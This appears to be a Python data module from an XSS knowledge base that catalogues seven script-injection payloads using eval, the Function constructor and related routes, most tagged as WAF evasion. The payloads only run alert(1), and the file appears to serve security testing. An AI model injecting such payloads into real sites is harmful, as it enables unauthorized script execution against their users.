#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Code Execution Payloads
"""

from ..models import PayloadEntry


EVAL_LIKE_PAYLOADS = {
    "eval_direct": PayloadEntry(
        payload="<script>eval('alert(1)')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Direct eval",
        tags=["eval"],
        reliability="high",
    ),
    "eval_indirect": PayloadEntry(
        payload="<script>(0,eval)('alert(1)')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Indirect eval",
        tags=["eval", "indirect"],
        waf_evasion=True,
        reliability="high",
    ),
    "eval_window": PayloadEntry(
        payload="<script>window.eval('alert(1)')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="window.eval",
        tags=["eval", "window"],
        waf_evasion=True,
        reliability="high",
    ),
    "func_constructor": PayloadEntry(
        payload="<script>Function('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Function constructor",
        tags=["function", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
    "func_constructor_new": PayloadEntry(
        payload="<script>new Function('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="new Function",
        tags=["function", "constructor", "new"],
        waf_evasion=True,
        reliability="high",
    ),
    "async_func_constructor": PayloadEntry(
        payload="<script>(async function(){}).constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="AsyncFunction constructor",
        tags=["function", "async", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
    "generator_func_constructor": PayloadEntry(
        payload="<script>(function*(){}).constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="GeneratorFunction constructor",
        tags=["function", "generator", "constructor"],
        waf_evasion=True,
        reliability="high",
    ),
}

EVAL_LIKE_PAYLOADS_TOTAL = len(EVAL_LIKE_PAYLOADS)
